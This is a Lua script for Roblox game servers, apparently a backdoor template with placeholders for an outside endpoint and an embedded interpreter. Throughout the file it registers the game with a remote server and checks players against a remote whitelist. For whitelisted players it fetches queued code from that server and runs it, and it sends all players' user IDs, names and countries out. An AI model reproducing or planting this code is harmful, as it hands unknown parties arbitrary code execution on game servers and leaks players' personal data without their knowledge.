local https = game:GetService("HttpService")
local plrs = game:GetService("Players")

local endpoint = "http://{{endpoint}}/"

{{vlua}}

local threads = {}
local executionThreads = {}

pcall(function()
    https:PostAsync(endpoint.."api/game?placeid="..tostring(game.PlaceId), "")
end)

local whitelisted = {}
local whitelist = function(plr)
    local isWhitelisted = https:JSONDecode(https:GetAsync(endpoint.."api/whitelist?userid="..tostring(plr.UserId)))
    
    if isWhitelisted then
        table.insert(whitelisted, plr)
        executionThreads[tostring(plr.UserId)] = {}
    end

    return isWhitelisted
end

local function cleanupExecutionThreads(userId)
    if executionThreads[userId] then
        for i, thread in ipairs(executionThreads[userId]) do
            if coroutine.status(thread) ~= "dead" then
                coroutine.close(thread)
            end
        end
        executionThreads[userId] = {}
    end
end

local function plrAdded(plr)
    if whitelist(plr) then
        threads[tostring(plr.UserId)] = coroutine.create(function()
            while true do
                task.wait(#whitelisted)
                pcall(function()
                    local queue = https:JSONDecode(https:GetAsync(endpoint.."api/ping?userid="..tostring(plr.UserId), true))
                    for _, code in pairs(queue) do
                        coroutine.wrap(function()
                            local userId = tostring(plr.UserId)
                            local thread = coroutine.running()
                            table.insert(executionThreads[userId], thread)
                            
                            pcall(function()
                                run(code)()
                            end)
                            
                            local index = table.find(executionThreads[userId], thread)
                            if index then
                                table.remove(executionThreads[userId], index)
                            end
                        end)()
                    end
                end)
                pcall(function()
                    local plrs = {}
                    for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
                        local info = {}
                        info["UserId"] = plr.UserId
                        info["DisplayName"] = plr.DisplayName
                        info["Username"] = plr.Name
                        info["Country"] = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(plr)
                        plrs[plr.Name] = info
                    end
                    https:PostAsync(endpoint.."api/players?userid="..tostring(plr.UserId), https:JSONEncode(plrs), Enum.HttpContentType.ApplicationJson, false)
                end)
            end
        end)
        coroutine.resume(threads[tostring(plr.UserId)])
    end
end
local function plrRemoving(plr)
    if whitelist(plr) then
        pcall(function()
            https:PostAsync(endpoint.."api/close", "", Enum.HttpContentType.TextPlain, false, {["user-id"]=tostring(plr.UserId)})
        end)
        local userId = tostring(plr.UserId)
        cleanupExecutionThreads(userId)
        coroutine.close(threads[userId])
        threads[userId] = nil
        executionThreads[userId] = nil
    end
end

for _, plr in pairs(plrs:GetPlayers()) do
    plrAdded(plr)
end
plrs.PlayerAdded:Connect(plrAdded)
plrs.PlayerRemoving:Connect(plrRemoving)

game:BindToClose(function()
    for _, plr in pairs(plrs:GetPlayers()) do
        plrRemoving(plr)
    end
    wait(1)
end)